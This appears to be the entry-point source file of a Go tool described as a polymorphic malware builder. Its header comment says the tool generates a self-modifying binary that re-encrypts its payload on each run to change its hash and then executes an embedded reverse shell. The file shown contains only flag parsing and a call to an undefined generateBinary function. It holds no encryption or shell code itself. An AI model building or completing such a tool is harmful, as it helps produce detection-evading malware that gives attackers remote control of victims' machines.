// Polymorphic generates a self-modifying binary that re-encrypts its
// payload on every run (changing its hash) while keeping the same
// behaviour, then executes the embedded reverse shell payload.
//
// Usage:
//
//	polymorphic --generate polymorphic.exe --payload reverse_shell.py
package main

import (
	"flag"
	"fmt"
	"os"
)

func main() {
	flag.Usage = func() {
		fmt.Fprintln(os.Stderr, "Polymorphic Program Usage:")
		fmt.Fprintln(os.Stderr, "  --generate <output-binary>   Generate a polymorphic binary.")
		fmt.Fprintln(os.Stderr, "  --payload  <payload-file>    Embed the reverse shell payload.")
	}

	generate := flag.String("generate", "", "output binary path")
	payload := flag.String("payload", "", "payload file to embed")
	flag.Parse()

	if *generate == "" || *payload == "" {
		flag.Usage()
		os.Exit(2)
	}

	if err := generateBinary(*payload, *generate); err != nil {
		fmt.Fprintf(os.Stderr, "polymorphic: %v\n", err)
		os.Exit(1)
	}
}
